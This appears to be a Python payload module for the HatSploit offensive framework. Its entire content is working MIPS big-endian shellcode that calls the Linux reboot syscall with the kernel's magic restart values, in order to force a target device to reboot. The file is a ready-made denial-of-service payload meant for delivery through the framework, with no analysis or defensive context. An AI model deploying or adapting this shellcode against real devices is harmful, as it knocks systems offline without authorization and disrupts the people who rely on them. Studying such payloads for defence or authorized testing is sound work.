"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__({
            'Name': "Linux mipsbe Reboot",
            'Payload': "linux/mipsbe/reboot",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload is intended to force reboot Linux "
                "with MIPS big-endian architecture."
            ),
            'Arch': ARCH_MIPSBE,
            'Platform': OS_LINUX,
            'Type': ONE_SIDE,
        })

    def run(self):
        return self.assemble(
            """
            start:
                lui     $a2, 0x4321
                ori     $a2, $a2, 0xfedc
                lui     $a1, 0x2812
                ori     $a1, $a1, 0x1969
                lui     $a0, 0xfee1
                ori     $a0, $a0, 0xdead
                addiu   $v0, $zero, 0xff8
                syscall 0x40404
            """,
        )
